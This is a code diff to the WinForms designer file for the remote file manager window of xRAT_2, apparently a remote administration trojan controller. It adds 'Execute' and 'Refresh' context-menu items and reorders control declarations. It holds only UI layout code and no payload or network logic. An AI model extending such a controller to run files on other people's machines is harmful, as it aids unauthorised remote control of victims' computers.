@@ -32,23 +32,26 @@
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmFileManager));
             this.cmbDrives = new System.Windows.Forms.ComboBox();
             this.lblDrive = new System.Windows.Forms.Label();
-            this.lstDirectory = new xRAT_2.Controls.ListViewEx();
-            this.hName = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.hSize = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.hType = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.ctxtMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
             this.ctxtDownload = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtExecute = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtRefresh = new System.Windows.Forms.ToolStripMenuItem();
             this.imgListDirectory = new System.Windows.Forms.ImageList(this.components);
             this.botStrip = new System.Windows.Forms.StatusStrip();
             this.btnOpenDLFolder = new System.Windows.Forms.Button();
             this.TabControlFileManager = new System.Windows.Forms.TabControl();
             this.tabFileExplorer = new System.Windows.Forms.TabPage();
             this.tabTransfers = new System.Windows.Forms.TabPage();
+            this.imgListTransfers = new System.Windows.Forms.ImageList(this.components);
+            this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
+            this.lstDirectory = new xRAT_2.Controls.ListViewEx();
+            this.hName = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hSize = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hType = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lstTransfers = new xRAT_2.Controls.ListViewEx();
             this.hID = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hStatus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hFilename = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.imgListTransfers = new System.Windows.Forms.ImageList(this.components);
             this.ctxtMenu.SuspendLayout();
             this.TabControlFileManager.SuspendLayout();
             this.tabFileExplorer.SuspendLayout();
@@ -74,57 +77,39 @@
             this.lblDrive.TabIndex = 0;
             this.lblDrive.Text = "Drive:";
             // 
-            // lstDirectory
-            // 
-            this.lstDirectory.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
-            | System.Windows.Forms.AnchorStyles.Left) 
-            | System.Windows.Forms.AnchorStyles.Right)));
-            this.lstDirectory.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
-            this.hName,
-            this.hSize,
-            this.hType});
-            this.lstDirectory.ContextMenuStrip = this.ctxtMenu;
-            this.lstDirectory.FullRowSelect = true;
-            this.lstDirectory.GridLines = true;
-            this.lstDirectory.Location = new System.Drawing.Point(11, 36);
-            this.lstDirectory.Name = "lstDirectory";
-            this.lstDirectory.Size = new System.Drawing.Size(659, 315);
-            this.lstDirectory.SmallImageList = this.imgListDirectory;
-            this.lstDirectory.TabIndex = 2;
-            this.lstDirectory.UseCompatibleStateImageBehavior = false;
-            this.lstDirectory.View = System.Windows.Forms.View.Details;
-            this.lstDirectory.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(this.lstDirectory_ColumnClick);
-            this.lstDirectory.DoubleClick += new System.EventHandler(this.lstDirectory_DoubleClick);
-            // 
-            // hName
-            // 
-            this.hName.Text = "Name";
-            this.hName.Width = 163;
-            // 
-            // hSize
-            // 
-            this.hSize.Text = "Size";
-            this.hSize.Width = 117;
-            // 
-            // hType
-            // 
-            this.hType.Text = "Type";
-            this.hType.Width = 128;
-            // 
             // ctxtMenu
             // 
             this.ctxtMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.ctxtDownload});
+            this.ctxtDownload,
+            this.ctxtExecute,
+            this.ctxtLine,
+            this.ctxtRefresh});
             this.ctxtMenu.Name = "ctxtMenu";
-            this.ctxtMenu.Size = new System.Drawing.Size(129, 26);
+            this.ctxtMenu.Size = new System.Drawing.Size(153, 98);
             // 
             // ctxtDownload
             // 
             this.ctxtDownload.Image = global::xRAT_2.Properties.Resources.download;
             this.ctxtDownload.Name = "ctxtDownload";
-            this.ctxtDownload.Size = new System.Drawing.Size(128, 22);
+            this.ctxtDownload.Size = new System.Drawing.Size(152, 22);
             this.ctxtDownload.Text = "Download";
             this.ctxtDownload.Click += new System.EventHandler(this.ctxtDownload_Click);
+            // 
+            // ctxtExecute
+            // 
+            this.ctxtExecute.Image = global::xRAT_2.Properties.Resources.run;
+            this.ctxtExecute.Name = "ctxtExecute";
+            this.ctxtExecute.Size = new System.Drawing.Size(152, 22);
+            this.ctxtExecute.Text = "Execute";
+            this.ctxtExecute.Click += new System.EventHandler(this.ctxtExecute_Click);
+            // 
+            // ctxtRefresh
+            // 
+            this.ctxtRefresh.Image = global::xRAT_2.Properties.Resources.refresh;
+            this.ctxtRefresh.Name = "ctxtRefresh";
+            this.ctxtRefresh.Size = new System.Drawing.Size(152, 22);
+            this.ctxtRefresh.Text = "Refresh";
+            this.ctxtRefresh.Click += new System.EventHandler(this.ctxtRefresh_Click);
             // 
             // imgListDirectory
             // 
@@ -196,6 +181,55 @@
             this.tabTransfers.Text = "Transfers";
             this.tabTransfers.UseVisualStyleBackColor = true;
             // 
+            // imgListTransfers
+            // 
+            this.imgListTransfers.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imgListTransfers.ImageStream")));
+            this.imgListTransfers.TransparentColor = System.Drawing.Color.Transparent;
+            this.imgListTransfers.Images.SetKeyName(0, "cancel.png");
+            this.imgListTransfers.Images.SetKeyName(1, "done.png");
+            // 
+            // ctxtLine
+            // 
+            this.ctxtLine.Name = "ctxtLine";
+            this.ctxtLine.Size = new System.Drawing.Size(149, 6);
+            // 
+            // lstDirectory
+            // 
+            this.lstDirectory.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+            | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.lstDirectory.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.hName,
+            this.hSize,
+            this.hType});
+            this.lstDirectory.ContextMenuStrip = this.ctxtMenu;
+            this.lstDirectory.FullRowSelect = true;
+            this.lstDirectory.GridLines = true;
+            this.lstDirectory.Location = new System.Drawing.Point(11, 36);
+            this.lstDirectory.Name = "lstDirectory";
+            this.lstDirectory.Size = new System.Drawing.Size(659, 315);
+            this.lstDirectory.SmallImageList = this.imgListDirectory;
+            this.lstDirectory.TabIndex = 2;
+            this.lstDirectory.UseCompatibleStateImageBehavior = false;
+            this.lstDirectory.View = System.Windows.Forms.View.Details;
+            this.lstDirectory.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(this.lstDirectory_ColumnClick);
+            this.lstDirectory.DoubleClick += new System.EventHandler(this.lstDirectory_DoubleClick);
+            // 
+            // hName
+            // 
+            this.hName.Text = "Name";
+            this.hName.Width = 163;
+            // 
+            // hSize
+            // 
+            this.hSize.Text = "Size";
+            this.hSize.Width = 117;
+            // 
+            // hType
+            // 
+            this.hType.Text = "Type";
+            this.hType.Width = 128;
+            // 
             // lstTransfers
             // 
             this.lstTransfers.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
@@ -229,13 +263,6 @@
             // 
             this.hFilename.Text = "Filename";
             this.hFilename.Width = 417;
-            // 
-            // imgListTransfers
-            // 
-            this.imgListTransfers.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imgListTransfers.ImageStream")));
-            this.imgListTransfers.TransparentColor = System.Drawing.Color.Transparent;
-            this.imgListTransfers.Images.SetKeyName(0, "cancel.png");
-            this.imgListTransfers.Images.SetKeyName(1, "done.png");
             // 
             // frmFileManager
             // 
@@ -284,5 +311,8 @@
         private System.Windows.Forms.ColumnHeader hFilename;
         private System.Windows.Forms.ColumnHeader hID;
         private System.Windows.Forms.ImageList imgListTransfers;
+        private System.Windows.Forms.ToolStripMenuItem ctxtExecute;
+        private System.Windows.Forms.ToolStripMenuItem ctxtRefresh;
+        private System.Windows.Forms.ToolStripSeparator ctxtLine;
     }
 }
